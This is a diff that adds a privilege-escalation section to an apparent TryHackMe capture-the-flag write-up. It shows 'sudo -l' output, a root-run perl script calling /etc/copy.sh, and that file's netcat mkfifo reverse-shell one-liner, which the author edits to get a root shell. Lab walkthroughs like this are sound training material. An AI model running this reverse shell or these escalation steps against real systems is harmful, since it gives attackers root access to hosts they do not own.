@@ -13,4 +13,21 @@ We can just open this file in text editor and I got credentials for manager acco
 
 
 // PRIV ESC PART //
+I spawned a shell via python: python -c 'import pty;pty.spawn("bin/bash")' 
+
 One of the easiest ways to find potential privelage escalation methods is sudo -l. 
+Output:
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+    
+Luckily we got some prics and we can run some script as root in /home/itguy. I checked this script to know what what is he doing. Output:
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+Ok, so this script is very short because its only one line of code and this one runs another script, located in /etc/.
+
+Output of script located in /etc:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+Its just reverse shell mini script using netcat, so we just change this ip and port, run our nc listener and we got root shell. 
